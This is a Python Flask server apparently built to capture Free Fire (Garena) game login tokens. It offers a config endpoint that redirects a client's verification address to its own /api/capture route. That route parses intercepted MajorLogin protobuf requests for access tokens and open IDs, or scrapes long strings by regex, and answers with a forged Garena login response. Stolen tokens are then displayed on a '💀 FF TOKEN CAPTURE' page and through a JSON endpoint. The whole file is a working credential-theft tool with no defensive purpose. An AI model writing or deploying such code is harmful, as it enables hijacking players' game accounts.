import os
import sys
import time
import json
import re
from flask import Flask, request, jsonify, Response

# Add project root to sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

app = Flask(__name__)

# In-memory storage for token
token_store = {
    'latest': None
}

# Load Protobuf models safely
try:
    from MajorLoginReq_pb2 import MajorLogin
except Exception as e:
    MajorLogin = None
    print(f"[-] MajorLogin import error: {e}")

try:
    from MajorLoginRes_pb2 import MajorLoginRes
except Exception as e:
    MajorLoginRes = None
    print(f"[-] MajorLoginRes import error: {e}")


@app.route('/api/config', methods=['GET', 'POST'])
def get_config():
    config = {
        "verAddr": "https://ff-token-captures.vercel.app/api/capture",
        "tokenCapture": True,
        "version": "1.0.0"
    }
    return jsonify(config), 200


@app.route('/api/capture', methods=['GET', 'POST'])
def capture():
    global token_store
    raw = request.get_data() or b""
    print(f"[*] Raw data received: {len(raw)} bytes")
    
    token = None
    open_id = None
    
    # 1. Try Protobuf parsing
    if MajorLogin and len(raw) > 0:
        try:
            req = MajorLogin()
            req.ParseFromString(raw)
            if req.access_token:
                token = req.access_token
            if req.open_id:
                open_id = req.open_id
        except Exception as e:
            print(f"[-] Protobuf decode error: {e}")
    
    # 2. Fallback byte string extraction if token not found
    if not token and len(raw) > 0:
        try:
            # Look for ASCII/UTF-8 strings inside payload
            matches = re.findall(b'[a-zA-Z0-9_-]{20,}', raw)
            if matches:
                token = matches[0].decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"[-] Regex extraction error: {e}")

    if token:
        token_store['latest'] = {
            'access_token': token,
            'open_id': open_id or 'N/A',
            'timestamp': time.time()
        }
        print(f"[+] Token captured: {token[:20]}...")
    
    # Build protobuf response
    if MajorLoginRes:
        try:
            res = MajorLoginRes()
            res.account_id = 123456789
            res.token = "session_placeholder"
            res.ttl = 3600
            res.server_url = "https://game.garena.com"
            res.queue_info.Allow = True
            res.queue_info.queue_position = 0
            res.queue_info.need_wait_secs = 0
            return Response(res.SerializeToString(), status=200, mimetype="application/octet-stream")
        except Exception as e:
            print(f"[-] Response build error: {e}")
            
    return Response(b"", status=200, mimetype="application/octet-stream")


@app.route('/api/get-token', methods=['GET'])
def get_token():
    token_data = token_store.get('latest')
    if token_data:
        return jsonify({
            "access_token": token_data.get('access_token'),
            "open_id": token_data.get('open_id'),
            "timestamp": token_data.get('timestamp')
        }), 200
    return jsonify({"error": "No token captured yet"}), 404


@app.route('/')
@app.route('/api/show-token')
def show_token():
    data = token_store.get('latest')
    
    if data:
        status = "✅ Token Captured!"
        status_color = "#00ff00"
        token_display = data.get('access_token', 'N/A')
        openid_display = data.get('open_id', 'N/A')
        time_display = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(data.get('timestamp', 0)))
    else:
        status = "⏳ Waiting for token..."
        status_color = "#eab308"
        token_display = "Not captured yet"
        openid_display = "Not captured yet"
        time_display = "Waiting..."
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF Token Capture</title>
    <meta http-equiv="refresh" content="5">
    <style>
        * {{ box-sizing: border-box; }}
        body {{
            font-family: 'Courier New', Courier, monospace;
            background: #0d1117;
            color: #00ff66;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }}
        .box {{
            background: #161b22;
            padding: 35px;
            border-radius: 16px;
            border: 2px solid #00ff66;
            box-shadow: 0 0 30px rgba(0, 255, 102, 0.25);
            max-width: 650px;
            width: 100%;
        }}
        h1 {{
            text-align: center;
            color: #00ff66;
            margin-top: 0;
            font-size: 26px;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(0, 255, 102, 0.5);
        }}
        .label {{
            color: #8b949e;
            margin-top: 18px;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        .value {{
            background: #090d13;
            padding: 14px;
            border-radius: 8px;
            border: 1px solid #30363d;
            word-break: break-all;
            margin-top: 6px;
            color: #ffffff;
            font-size: 14px;
        }}
        .status {{
            text-align: center;
            padding: 12px;
            border: 1px solid {status_color};
            border-radius: 8px;
            margin-top: 24px;
            color: {status_color};
            font-weight: bold;
            font-size: 16px;
            background: rgba(0, 0, 0, 0.3);
        }}
        .endpoints {{
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid #21262d;
            font-size: 12px;
            color: #8b949e;
        }}
        .endpoints a {{
            color: #58a6ff;
            text-decoration: none;
        }}
        .endpoints a:hover {{
            text-decoration: underline;
        }}
    </style>
</head>
<body>
    <div class="box">
        <h1>💀 FF TOKEN CAPTURE</h1>
        <div class="label">📱 Access Token</div>
        <div class="value">{token_display}</div>
        <div class="label">🆔 Open ID</div>
        <div class="value">{openid_display}</div>
        <div class="label">📅 Last Timestamp</div>
        <div class="value">{time_display}</div>
        <div class="status">{status}</div>
        <div class="endpoints">
            <strong>Endpoints:</strong><br>
            • Config: <a href="/api/config">/api/config</a><br>
            • Capture (POST): <code>/api/capture</code><br>
            • Get Token (JSON): <a href="/api/get-token">/api/get-token</a>
        </div>
    </div>
</body>
</html>"""
    return html, 200, {'Content-Type': 'text/html'}


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
